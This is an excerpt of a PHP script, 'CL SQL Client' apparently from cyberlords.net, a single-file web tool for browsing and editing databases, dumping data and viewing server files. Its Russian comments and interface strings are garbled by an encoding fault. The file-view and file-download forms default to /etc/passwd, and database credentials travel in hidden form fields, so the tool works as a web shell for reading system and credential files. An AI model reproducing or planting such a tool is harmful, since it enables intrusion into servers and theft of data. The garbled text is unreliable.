...
/********************************************************************************
/*
/*  CL SQL Client - 镳钿忤眢螓� SQL-戾礤滏屦 礤 篑蝮镟栝 phpmyadmin 囗嚯钽囔.
/*
/*  蔓 祛驽蝈 徨耧豚蝽� 耜圜囹� 镱耠邃睨� 忮瘃棹 磬 漕爨彘 耱疣龛麝� 镳钿箨蜞 (cyberlords.net):
/*
/*  ~~~~~~~~~~~~~~~~
/*  [!] Important
/*  [+] New
...
/*  Library features:
/*   ~ 物蜩扈玷痤忄睇� 嚯泐痂蜢
/*   ~ 骂珈铈眍耱� 镱潢膻麇龛� � 聊 麇疱� Unix Socket
/*   ~ 橡铖祛蝠, 疱溧牝桊钼囗桢 怦艴 漕耱箫睇� 徉� 潆� 嚓赅箜蜞, 耦玟囗桢 眍恹� 徉�.
/*   ~ 橡铖祛蝠, 疱溧牝桊钼囗桢, 耦玟囗桢 眍恹� 蜞犭桷 耦 怦邂铉祛骓� 囹痂狍蜞扈.
/*   ~ 绣溧牝桊钼囗桢 铗溴朦睇� 镱脲� 蜞犭桷, 箐嚯屙桢 玎镨皴�, 漕徉怆屙桢 玎镨皴� � 蜞犭桷�, 镥疱桁屙钼囗桢 蜞犭桷.
/*   ~ 蔓镱腠屙桢 镳铊玮铍钽� 玎镳铖� � 聊 � 蜞犭桷囔.
/*   ~ 泥祜� 徉� � 蜞犭桷, � 忸珈铈眍耱 铗镳噔觇 镱 HTTP 桦� 镳铖蝾 镱赅玎 溧祜� � 狃铙珏疱.
/*   ~ 橡铖祛蝠 羿殡钼.
/*
...
$lang = array(
 ...
 'ru_text21' => '杨躔囗栩� 蜞犭桷�',
 'ru_text22' => '羊痼牝箴� 蜞犭桷�',
 'ru_text23' => '羊痼牝箴� � 桧纛痨圉棹',
 'ru_text24' => '羊痼牝箴�',
 'ru_text25' => '软纛痨圉棹',
 'ru_text26' => '殃圜囹�',
 'ru_text27' => '马桁囗桢!!! 脏殡 礤 耋耱怏弪 桦� 礤� 镳噔 潆� 黩屙��',
 'ru_text28' => '马桁囗桢!!! 脏殡 矬耱铋 桦� 漯筱�� 铠栳赅',
 'ru_text29' => '软纛痨圉�� SQL 皴疴屦�',
 'ru_text30' => '愉嚯栩� 耜痂矧',
 'ru_text31' => '扬囫栳� 黩� 镱朦珙忄腓顸 SQL 觌桢眚铎 '.$version,
 // English  
 'en_text1' => 'Load File',
 'en_text2' => 'Query',
...
if (!function_exists("AlphanumericalClean")) {
 function AlphanumericalClean( $str = false ) {
  return preg_replace( "/[^�-��-遖-zA-Z0-9\-\_\ ]/", "" , $str );
 }
}
...
if($act == '00') {
 ...
 if($CODE == '00' && isset($tbl)) {
  ...
  if(!sql_num_fields($sql)) {
   ...
   echo "\n<BR><BR>羊痼牝箴� 蜞犭桷� [ <B>".AlphanumericalClean($tbl)."</B> ]\n<BR>\n<table align=\"center\" border=\"0\" width=\"700\">\n<tr align=\"center\">\n <td>Field</td>\n <td>Type</td>\n <td>NULL</td>\n <td>Key</td>\n <td>Default</td>\n <td>Extra</td>\n <td colspan=\"5\">Action</td>\n</tr>";
   while ($row = sql_fetch_assoc($sql)) {
    echo "\n<tr onmouseover=this.style.backgroundColor=\"#CCCCCC\" onmouseout=this.style.backgroundColor=\"\">";
 ...
 if(isset($file) && !empty($file)) {
  ...
  echo "\n<img border=\"0\" src=\"".basename(__FILE__)."?image=download\">&nbsp;<B>".$lang[$language.'_text11']."</B>\n<BR><BR>\n<form method=\"post\" action=\"".basename(__FILE__)."\">\n<input type=\"hidden\" name=\"login\" value=\"".$login."\">\n<input type=\"hidden\" name=\"password\" value=\"".$password."\">\n<input type=\"hidden\" name=\"server\" value=\"".$server ."\">\n<input type=\"hidden\" name=\"port\" value=\"".$port ."\">\n<input type=\"hidden\" name=\"dbtype\" value=\"".$dbtype."\">\n<input type=\"hidden\" name=\"db\" value=\"".$db."\">\n<input type=\"hidden\" name=\"act\" value=\"11\">项腠 矬螯 � 羿殡�: <input type=\"text\" name=\"file\" value=\"/etc/passwd\" size=\"40\"><input type=\"submit\" value=\"".$lang[$language.'_text11']."\"></form>";
 }
} elseif($act == '12') {
 if(isset($file) && !empty($file)) {
  if(file_exists($file) and  is_readable($file)) {
  ...
  echo "\n<img border=\"0\" src=\"".basename(__FILE__)."?image=download\">&nbsp;<B>".$lang[$language.'_text26']."</B>\n<BR><BR>\n<form method=\"post\" action=\"".basename(__FILE__)."\">\n<input type=\"hidden\" name=\"login\" value=\"".$login."\">\n<input type=\"hidden\" name=\"password\" value=\"".$password."\">\n<input type=\"hidden\" name=\"server\" value=\"".$server ."\">\n<input type=\"hidden\" name=\"port\" value=\"".$port ."\">\n<input type=\"hidden\" name=\"dbtype\" value=\"".$dbtype."\">\n<input type=\"hidden\" name=\"db\" value=\"".$db."\">\n<input type=\"hidden\" name=\"act\" value=\"12\">项腠 矬螯 � 羿殡�: <input type=\"text\" name=\"file\" value=\"/etc/passwd\" size=\"40\"><input type=\"submit\" value=\"".$lang[$language.'_text26']."\"></form>";
 }
} elseif($act == '13') {
